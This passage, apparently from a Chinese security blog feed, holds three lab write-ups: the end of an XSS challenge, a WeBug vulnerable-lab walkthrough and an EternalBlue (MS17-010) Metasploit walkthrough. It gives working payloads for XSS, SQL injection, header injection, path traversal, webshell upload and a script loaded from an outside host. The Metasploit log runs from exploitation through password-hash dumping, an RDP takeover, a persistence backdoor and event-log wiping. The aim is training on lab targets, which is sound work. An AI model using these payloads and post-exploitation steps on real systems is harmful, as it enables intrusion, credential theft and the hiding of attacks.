//使用$_COOKIE变量来取回cookie中user的值$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt; //再此进行注入&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，发现是xss进行的cookie注入，那么抓包修改cookie即可 123456789GET /xss/level13.php?keyword=good%20job! HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Cookie: user=&quot; onclick=alert(1) type=&quot;text&quot;Connection: close Level 14：查看源码 12&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt; payload： 1&quot;&gt;&lt;img src=1 onerror=alert(1)&gt; Level 15：12345&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;?&gt; ng-include 指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。 ng-include 属性的值可以是一个表达式，返回一个文件名。 默认情况下，包含的文件需要包含在同一个域名下。 其payload为： 1src=level1.php?name=1&apos;window.alert() 或者包含第一关 1src=&apos;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&apos; 参考文章：https://www.jianshu.com/p/06c644dafa0d ​ https://www.cnblogs.com/bmjoker/p/9446472.html]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebBug靶机实验]]></title>
    <url>%2F2019%2F02%2F25%2FWebBug%E9%9D%B6%E6%9C%BA%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[男儿不展同云志，空负天生八尺躯! weBug环境介绍: WeBug名称定义为“我们的漏洞”靶场环境。基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞。所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中，这个靶场基本包括了各种各样的常见漏洞，十分适合新手入门。 WeBug安装使用: 此安装包webug是3.0版本，所有的漏洞环境都已经搭建好了，解压后只要在vm虚拟机内打开，就可直接使用测试，无需繁琐的环境配置。具体操作：用winrar将安装包解压，用VM虚拟机打开解压文件里的win2003虚拟机文件。进入虚拟机系统后，打开命令行，输入：ipconfig，查看虚拟机的IP地址，然后直接在物理机的浏览器上输入该IP地址，就可以直接进入靶场了。 WeBug包含的漏洞: 目前该靶场包含以下漏洞（超全！特别适合练手）:get注入；图片破解；信息收集练习——目录端口收集；暴力破解练习；x-forwarded-for注入；支付漏洞；垂直越权；CSRF；url跳转；GET任意文件下载；POST任意文件下载；无验证上传；反射型XSS；存储型XSS；校验扩展名上传；验证来源去向的url跳转；文件包含；POST文件包含；HOST注入；APK破解；延时注入；DZ7.2论坛sql注入；aspcms注入；phpmyadmin任意文件包含漏洞；齐博系统SQL注入；海盗云商getshell；PHP168任意代码执行GET SHELL；ecshop 注入；ShopXp系统SQL注射漏洞；Dcore(轻型CMS系统)注入漏洞；MetInfo 任意文件包含漏洞可getshell；Metinfo news.php盲注；Metinfo img.php盲注；万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入；BEESCMS sql注入，无视防御；ourphp 注入；phpwind 命令执行漏洞；metinfo 任意用户密码修改；DZ 3.2 存储型XSS；DedeCMS flink.php友情链接注入；DedeCms?recommend.php注入；BEESCMS 小于等于V4四处注入+无需密码直接进后台；海洋 x-forwarded-for注入；php截断利用；st2-016；jboss命令执行；tomcat弱口令；hfs远程命令执行；st2-052命令执行；flash远程命令执行；gh0st远程溢出；IIS6.0远程溢出下载链接：https://pan.baidu.com/s/1h5tfc918DkLgk1fUAlnWNQ提取码：cfyr 第一关:普通的GET注入提交id为1,出现编号1的商品,输入1’,系统出现查询数据库错误的提示那么接下来爆系统SQL语句查询的字段个数,其payload为:1’ order by 5–+将数字5换成4,结果返回正常,证明其查询的字段数是4个 然后爆字段所在位置,其payload为:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,4--+ 得到查询的字段分别位于”编号”,”名称”,”价格”,”数量”的位置 查询当前用户,数据库版本,当前数据库名,其payload为:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,user(),version(),database()--+ 当前用户:root@localhost版本为:5.5.53数据库名:pentesterlab查所有数据库库名:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(schema_name)from information_schema.schemata --+ 得到的数据库为:information_schema,beecms,dedecmsv57gbk,dedecmsv57gbksp1,deescms,discuz,ecshop1,haidao,hiwiki,merinfo3,metinfo1,metinfo2,metinfoxiugai,mysql,ourphp,pentesterlab,performance_schema,php168,phpwind,qibo,seacms,test,ultrax,wanzhong,wiki,wiki11 查当前数据库中的表:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(table_name)from information_schema.tables where table_schema=&apos;pentesterlab&apos;--+ 得到的当前数据库pentesterlab中的所有表名:comment,flag,goods,user 查找flag表中的列名:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(column_name)from information_schema.columns where table_name=&apos;flag&apos;--+ 结果为:id,flag查看其值:1http://192.168.239.131/pentest/test/sqli/sqltamp.php?gid=1&apos; union select 1,2,3,group_concat(id,0x7e,flag)from flag--+ 结果为:1~204f704fbbcf6acf398ffee11989b377 第二关: 从图中你能找到什么?将图片保存到本地,notepad++打开就发现密码啦,官方说这道题有问题…. 第三关:你看到了什么?查看源代码,原来是要扫目录呀,我用的是Windows系统,直接用御剑跑,Linux下可以用dirb或者dirbuster去跑 扫到了这个test目录,得到提示把目录名md5加密访问加密后的值得到flag 第四关:告诉你了FLAG是5位数遇到表单上burp爆破得到用户名admin.密码admin123但是登录了没反应,后来发现是源码有问题,作者将flag注释了…… 第五关:一个优点小小的特殊的注入X-Forwarded-For注入:https://www.freebuf.com/articles/web/164817.html两种方式解决这个问题(原理都是一样的)1,用burpsuite抓包,添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag第二种方式:使用火狐浏览器的Modify Headers,添加添加X-Forwarded-For头部,其值为union select 1,2,3,group_concat(id,0x7e,flag)from flag,确定,刷新页面即可出现所查询的值 第六关:支付漏洞打开遇到个登录页面,爆破呗,得到账户名密码是tom/123456看着很像支付漏洞,抓包修改价格为0.1元,购买成功 第七关:越权问题使用系统提供的账号密码登录点击修改密码,发现是以GET请求的方式传递用户名进行修改密码的操作,那么尝试将用户名修改为admin用户,看能不能越权修改管理员账号payload:1http://192.168.239.131/pentest/test/3/change.php?name=admin 是可以修改admin的密码的,但是需要旧密码, 查看其源码,只要输入的两次新密码正确就可以修改啦,不对原密码进行确认:12345678if($pwd2==$pwd3)&#123; //更新记录$updateSql = &quot;update user set pwd = &apos;&quot;.$pwd2.&quot;&apos; where uid=&apos;&quot;.$uid.&quot;&apos;&quot;;$result = mysql_query($updateSql);if($result&gt;0)&#123; echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;更改密码成功，请重新登录！&apos;);location.href=&apos;index.html&apos;&lt;/script&gt;&quot;;&#125; 第八关:CSRF首先使用tom/123456登录,观察其URL为tom用户,将tom替换成admin即可修改管理员密码,然后输入新密码,burp抓包右键制作CSRF POC保存至一个HTML文件中,将访问该文件的网站链接发送给管理员,管理员一点击即可修改其密码为我刚刚修改之后的密码 第九关:URL跳转查看源码,发现index.php存在任意url跳转1234$url=$_REQUEST[&apos;url&apos;];if($url!=null||$url!=&quot;&quot;)&#123; echo &quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;成功跳转！&apos;);location.href=&apos;&quot;.$url.&quot;&apos;&lt;/script&gt;&quot;;&#125; 那么其payload为:1http://192.168.239.131/pentest/test/5/index.php?url=www.baidu.com 第十关:GET类型任意下载漏洞打开链接提示404,查看源码源码又是源码写的有问题…..我们直接去访问download.php网址为:http://192.168.239.131/pentest/test/6/1/download.php点击下载,发现传递了一个参数fname 是下载的文件名 那么可能可以修改文件名实现任意文件下载,其payload为: 1http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/download.php 通过下载download.php这个文件证明存在任意文件下载漏洞,那么该去找存放管理员账号密码的文件我直接使用御剑扫描其后台,发现在http://192.168.239.131/pentest/test/6/1/db/文件下存在config.php文件 那么构造的payload为:1http://192.168.239.131/pentest/test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php 第11关:POST类型任意下载漏洞第10关是通过GET请求下载文件,第11关是通过POST请求下载文件,直接修改变量pic的值为config.php文件的路径即可 第12关:D盘找密码上传个PHP木马,确定其上传路径直接传一句话木马，上传上去后，然后在菜刀中上传mimikatz得到系统管理员登录密码为123456~ 第13关:反射型XSS构造payload:1http://192.168.239.131/pentest/test/9/?id=&lt;script src=http://c7.gg/bSTkf&gt;&lt;/script&gt; 第14关:存储型XSS构造payload:1&lt;script&gt;alert(/xss/)&lt;/script&gt; 第15题:上传漏洞制作一个图片马,上传,burp修改文件名为php即可成功上传成功解析菜刀连接 第16题:明天双十一 我从公司网络去剁手了！折腾了一会没找到答案,查看源码 1234567891011121314151617if(strstr($url,&quot;www.taobao.com&quot;))&#123; if($_SERVER[&apos;HTTP_HOST&apos;]==&quot;10.10.10.10&quot;)&#123; if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123; if(strstr($_SERVER[&apos;HTTP_REFERER&apos;],&quot;www.baidu.com&quot;))&#123; echo &quot;剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0&quot;.&quot;&lt;br/&gt;&quot;; &#125;else&#123; echo &quot;不想剁手了&quot;.&quot;&lt;br/&gt;&quot;; &#125; &#125;else&#123; echo &quot;nono&quot;.&quot;&lt;br/&gt;&quot;; &#125; &#125;else&#123; echo &quot;哎呀，这里只允许10.10.10.10访问！！！&quot;.&quot;&lt;br/&gt;&quot;; &#125; &#125;else&#123; echo &quot;这个地方剁手不好，换个地方！&quot;; &#125; 发现必须要满足三个条件才可以获得flag1.请求参数url=www.taobao.com2.referer为www.baidu.com3.HOST值为10.10.10.10]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[与永恒之蓝的一场旅行]]></title>
    <url>%2F2019%2F02%2F19%2Fms17-010%2F</url>
    <content type="text"><![CDATA[不断进步,直到羔羊变成雄狮! 漏洞背景:继2016年 8 月份黑客组织 Shadow Brokers 放出第一批 NSA “方程式小组”内部黑客工具后，2017 年 4 月 14 日，Shadow Brokers 再次公布了一批新的 NSA 黑客工具，其中包含了一个攻击框架和多个 Windows 漏洞利用工具。攻击者利用这些漏洞可以远程获取 Windows 系统权限并植入后门。 针对此次泄露的漏洞，微软提前发布了安全公告 MS17-010，修复了泄露的多个 SMB 远程命令执行漏洞。由于此次泄露的漏洞覆盖了大部分常见的 Windows 版本(包括微软不再提供更新服务的 Windows XP 和 Windows Server 2003)，网络空间中仍然存在大量可被入侵的设备 漏洞原理:永恒之蓝漏洞是通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 影响版本:目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。 目前在Metasploit上集成的攻击载荷是ms17_010_psexec和ms17_010_eternalblue,我在网上搜了好久,也没找到什么有价值的答案,我自己总结的是两点区别: 一:ms17_010_psexec是SMB的远程代码执行漏洞,ms17_010_eternalblue是SMB的远程窗口内核池损坏漏洞 二:ms17_010_psexec是针对于上述所说的Windows系统都适用的,而ms17_010_eternalblue只适用于win7和win server2008R2的全版本 这次我们使用ms17_010_psexec载荷进行渗透测试 利用前提:1.防火墙必须允许SMB流量出入 2.目标必须使用SMBv1协议 3.目标必须缺少MS17-010补丁 4.目标必须允许匿名IPC $和管道名 复现环境:攻击机:kali 4.15.0-kali2-amd64(192.168.135.134) 靶机:Windows server2003(192.168.135.136) 复现过程:信息收集使用nmap对目标系统进行信息收集同时去扫描目标存在的漏洞(Nessus或者AWVS等扫描器都可以) 1root@kali:~# nmap -sV --script=vuln -O 192.168.135.136 参数-sV表示对目标主机进行软件版本的检测 参数–script=vuln表示适用nmap自带的漏洞库区扫描目标系统存在的漏洞 参数-O表示扫描目标的操作系统 由于nmap默认扫描常用的一千个端口,所以我这里为了节省时间就没有加-p选项 扫出来啦鼎鼎有名的ms08-067漏洞和ms17-010漏洞这两个远程代码执行的漏洞 1234567891011121314Host script results:| smb-vuln-ms08-067: | VULNERABLE:| Microsoft Windows system vulnerable to remote code execution (MS08-067)| State: VULNERABLE| IDs: CVE:CVE-2008-4250| The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,| Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary| code via a crafted RPC request that triggers the overflow during path canonicalization.| | Disclosure date: 2008-10-23| References:| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx 1234567891011121314smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).| | Disclosure date: 2017-03-14| References:| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 漏洞利用:配置数据库我们使用Metasploit-Framework(简称MSF)去利用ms17-010远程代码执行漏洞 我们首先需要创建一个自己的数据库,将等会使用MSF获取的结果保存到我们自己的数据库中(也可以使用metasploit自带的数据库),MSF默认使用的数据库管理系统是PostgreSQL 打开Postgresql服务: 1root@kali:~# service postgresql start 或者 12root@kali:~# /etc/init.d/postgresql start[ ok ] Starting postgresql (via systemctl): postgresql.service. 查看数据库运行状态: 123456789root@kali:~# service postgresql status ● postgresql.service - PostgreSQL RDBMS Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled) Active: active (exited) since Mon 2019-02-18 16:22:16 CST; 24h ago Process: 11732 ExecStart=/bin/true (code=exited, status=0/SUCCESS) Main PID: 11732 (code=exited, status=0/SUCCESS)2月 18 16:22:16 kali systemd[1]: Starting PostgreSQL RDBMS...2月 18 16:22:16 kali systemd[1]: Started PostgreSQL RDBMS. 切换到postgres用户(Postgresql数据库管理系统所创建的用户) 1root@kali:~# su - postgres 创建数据库管理员kkk: 1234root@kali:~# su - postgres postgres@kali:~$ createuser kkk -P为新角色输入的口令: 再输入一遍: 创建数据库及其属主,其语法为createdb –owner=属主 数据库名 1postgres@kali:~$ createdb --owner=kkk database1 然后就可以打开MSF终端利用漏洞啦 1root@kali:~# msfconsole 查看当前所连接的数据库: 12msf &gt; db_status [*] postgresql connected to msf 断开连接,连接我们刚刚创建的数据库, 断开数据库连接命令:db_disconnent 连接新的数据库:格式是db_connect 用户名:密码@127.0.0.1/数据库名 12msf &gt; db_disconnect msf &gt; db_connect kkk:passwd@127.0.0.1/database1 确认漏洞这部分其实就是确认nmap扫描的结果是否准确,MSF提供专门扫描MS17-010的payload(载荷)我们可以在这里尝试一番,熟悉命令 123456789101112msf &gt; search ms17-010 //在漏洞库中搜索ms17-010的payload[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/admin/smb/ms17_010_command 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution auxiliary/scanner/smb/smb_ms17_010 normal MS17-010 SMB RCE Detection exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit/windows/smb/ms17_010_psexec 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 我们使用auxiliary辅助模块中的ms17_010_command载荷去扫描确认目标系统是否真的有SMB服务的远程代码执行的漏洞 1234567891011121314151617181920212223242526272829303132msf &gt; use auxiliary/admin/smb/ms17_010_command //使用该载荷msf auxiliary(admin/smb/ms17_010_command) &gt; set rhosts 192.168.135.136 //设置目标rhosts =&gt; 192.168.135.136msf auxiliary(admin/smb/ms17_010_command) &gt; exploit //进行攻击[*] 192.168.135.136:445 - Target OS: Windows Server 2003 3790 Service Pack 2[*] 192.168.135.136:445 - Filling barrel with fish... done[*] 192.168.135.136:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - [*] Preparing dynamite...[*] 192.168.135.136:445 - Trying stick 1 (x64)...Miss[*] 192.168.135.136:445 - [*] Trying stick 2 (x86)...Boom![*] 192.168.135.136:445 - [+] Successfully Leaked Transaction![*] 192.168.135.136:445 - [+] Successfully caught Fish-in-a-barrel[*] 192.168.135.136:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - Reading from CONNECTION struct at: 0x8fdf1cb0[*] 192.168.135.136:445 - Built a write-what-where primitive...[+] 192.168.135.136:445 - Overwrite complete... SYSTEM session obtained![+] 192.168.135.136:445 - Service start timed out, OK if running a command or non-service executable...[*] 192.168.135.136:445 - Output for &quot;net group &quot;Domain Admins&quot; /domain&quot;:ةĻ Domain Adminsעˍ ָ¶¨µœꝀ³ʔ±-------------------------------------------------------------------------------Administrator ļ®³ɹ¦Ϊ³ɡ£[+] 192.168.135.136:445 - Cleanup was successful[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed Successful 而且目标为Administrator 权限 攻击目标123msf auxiliary(admin/smb/ms17_010_command) &gt; use exploit/windows/smb/ms17_010_psexec //使用攻击模块msf exploit(windows/smb/ms17_010_psexec) &gt; set rhost 192.168.135.136 //设置目标rhost =&gt; 192.168.135.136 对于ms17_010_psexec攻击脚本,不需要设置payload,我原先设置windows/x64/meterpreter/reverse_tcp 载荷一直不出来结果,后来才得知这个攻击脚本里面有meterpreter的载荷,无需设置即可 1234567891011121314151617181920212223242526msf exploit(windows/smb/ms17_010_psexec) &gt; exploit //开始攻击[*] Started reverse TCP handler on 192.168.135.134:4444 [*] 192.168.135.136:445 - Target OS: Windows Server 2003 3790 Service Pack 2[*] 192.168.135.136:445 - Filling barrel with fish... done[*] 192.168.135.136:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - [*] Preparing dynamite...[*] 192.168.135.136:445 - Trying stick 1 (x64)...Miss[*] 192.168.135.136:445 - [*] Trying stick 2 (x86)...Boom![*] 192.168.135.136:445 - [+] Successfully Leaked Transaction![*] 192.168.135.136:445 - [+] Successfully caught Fish-in-a-barrel[*] 192.168.135.136:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;[*] 192.168.135.136:445 - Reading from CONNECTION struct at: 0x8f3e37c0[*] 192.168.135.136:445 - Built a write-what-where primitive...[+] 192.168.135.136:445 - Overwrite complete... SYSTEM session obtained![*] 192.168.135.136:445 - Selecting native target[*] 192.168.135.136:445 - Uploading payload...[*] 192.168.135.136:445 - Created \ZKbfdlYf.exe...[+] 192.168.135.136:445 - Service started successfully...[*] 192.168.135.136:445 - Deleting \ZKbfdlYf.exe...[-] 192.168.135.136:445 - Delete of \ZKbfdlYf.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)[*] Sending stage (179779 bytes) to 192.168.135.136[*] Sleeping before handling stage...[*] Meterpreter session 1 opened (192.168.135.134:4444 -&gt; 192.168.135.136:2240) at 2019-02-19 19:13:26 +0800meterpreter &gt; //攻击成功,拿到目标的会话 后渗透阶段先介绍一下Meterpreter: Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpretershell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。 在后渗透阶段我们将使用Meterpreter进行攻击 1234567891011121314151617181920meterpreter &gt; help //输入help命令可以查看在meterpreter模块下执行的命令meterpreter &gt; sysinfo //查看系统信息Computer : MYCOMPUTEROS : Windows .NET Server (Build 3790, Service Pack 2).Architecture : x86System Language : zh_CNDomain : LOUISNIELogged On Users : 3Meterpreter : x86/windowsmeterpreter &gt; getsystem //提升到system权限...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; hashdump //导出SAM数据库的内容Administrator:500:570ce399da1412abaad3b435b51404ee:b9d2d4955b330b503cc792eb6a55bb1f:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:98e07fb45acadfe5febbf70690d16ae0:::SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:18861c2baa27b5a9100c04acbbfa47d9:::IUSR_MYCOMPUTER:1108:e2e508b31b1336d2c996f97338db8790:03320631cb387004f82daec52f03935f:::IWAM_MYCOMPUTER:1109:fc512ee6de7b912f77747be12787d540:0f8f47aec1c4bc8897a81bce48cc20da:::MYCOMPUTER$:1005:aad3b435b51404eeaad3b435b51404ee:979f58fb772361956a63f2bc34036a09::: SAM简介: SAM是windows系统的一个系统用户账号管理文件。其全称为security account manager。Windows中对用户账户的安全管理使用了安全账号管理器SAM(security account manager)的机制,安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识都时完全不同的。因此，一旦某个账号被删除，它的安全标识就不再存在了，即使用相同的用户名重建账号，也会被赋予不同的安全标识，不会保留原来的权限。 其文件位置：C:\windows\system32\config\SAM 其格式是 用户名称:RID:LM-HASH值:NT-HASH::: 在Windows系统下,有两大hash,分别是LM HASH&amp;NT HASH 对于NT HASH,我们直接可以在cmd5网站进行解密,解密Administrator用户密码为redhat 1234567891011121314151617181920212223242526272829303132333435363738394041424344msf exploit(windows/smb/ms17_010_psexec) &gt;run post/windows/manage/enable_rdp //打开目标服务器的远程连接msf exploit(windows/smb/ms17_010_psexec) &gt;exploitmeterpreter &gt; portfwd add -l 2222 -r 192.168.135.136 -p 3389 //反弹目标的3389端口到本地的2222端口并监听该端口[*] Local TCP relay created: :2222 &lt;-&gt; 192.168.135.136:3389meterpreter &gt; portfwd //查看是否反弹成功Active Port Forwards==================== Index Local Remote Direction ----- ----- ------ --------- 1 0.0.0.0:2222 192.168.135.136:3389 Forward1 total active port forwards.root@kali:~# netstat -an | grep &quot;2222&quot; //我们在kali查看2222端口是在监听状态tcp 0 0 0.0.0.0:2222 0.0.0.0:* LISTEN root@kali:~# rdesktop 127.0.0.1:2222 //连接本地的2222端口反弹到目标的3389端口,即打开目标的桌面meterpreter &gt; ps //查看系统进程Process List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x86 0 NT AUTHORITY\SYSTEM 240 2792 mstsc.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\mstsc.exe 264 4 smss.exe x86 0 NT AUTHORITY\SYSTEM \SystemRoot\System32\smss.exe 292 808 explorer.exe x86 0 LOUISNIE\Administrator C:\WINDOWS\Explorer.EXE 312 264 csrss.exe x86 0 NT AUTHORITY\SYSTEM \??\C:\WINDOWS\system32\csrss.exe 336 264 winlogon.exe x86 0 NT AUTHORITY\SYSTEM \??\C:\WINDOWS\system32\winlogon.exe 384 336 services.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\services.exe 396 336 lsass.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\lsass.exe 452 1744 wuauclt.exe x86 2 LOUISNIE\Administrator C:\WINDOWS\system32\wuauclt.exe 588 384 vmacthlp.exe x86 0 NT AUTHORITY\SYSTEM meterpreter &gt; migrate 292 //将该会话和系统进程绑定,免杀.格式是:migrate PID meterpreter &gt; execute -H -i -f cmd.exe //创建新进程cmd.exe，-H不可见，-i交互 -f用系统命令去执行meterpreter &gt; kali 1569 //杀死进程,格式是:kali PID 植入后门,维持控制 1234567891011121314151617181920212223242526272829msf exploit(windows/smb/ms17_010_psexec) &gt; sessions -i 2 //开启第二个会话[*] Starting interaction with 2...meterpreter &gt; run persistence - X -i 5 -p 4445 -r 192.168.135.136 //运行后门程序，-X指定启动的方式为开机自启动，-i反向连接的时间间隔[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Running Persistence Script[*] Resource file for cleanup created at /root/.msf4/logs/persistence/MYCOMPUTER_20190219.3953/MYCOMPUTER_20190219.3953.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.135.136 LPORT=4445[*] Persistent agent script is 99670 bytes longmeterpreter &gt; background [*] Backgrounding session 2...msf exploit(windows/smb/ms17_010_psexec) &gt; back msf &gt; use exploit/multi/handler //使用exploit/multi/handler监听连入的backdoormsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp //设置载荷payload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 192.168.135.134 //设置将反弹到本地来lhost =&gt; 192.168.135.134msf exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 192.168.135.134:4444 [*] Sending stage (179779 bytes) to 192.168.135.136[*] Sleeping before handling stage...[*] Meterpreter session 3 opened (192.168.135.134:4444 -&gt; 192.168.135.136:2364) at 2019-02-19 21:42:12 +0800[*] Sending stage (179779 bytes) to 192.168.135.136[*] Sleeping before handling stage...[*] Meterpreter session 4 opened (192.168.135.1 或者我们可以使用metsvc模块来留下后门 metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件： metsvc.dll metsvc-service.exe metsvc.exe 12msf exploit(multi/handler) &gt; sessions -i 2 //选择一个会话meterpreter &gt; run metsvc //运行metsvc 清除日志: 1234meterpreter &gt; clearev [*] Wiping 1 records from Application...[*] Wiping 26 records from System...[*] Wiping 2281 records from Security...]]></content>
      <categories>
        <category>主机渗透</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入之基于函数报错的信息获取]]></title>
    <url>%2F2019%2F01%2F07%2FSQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%2F</url>
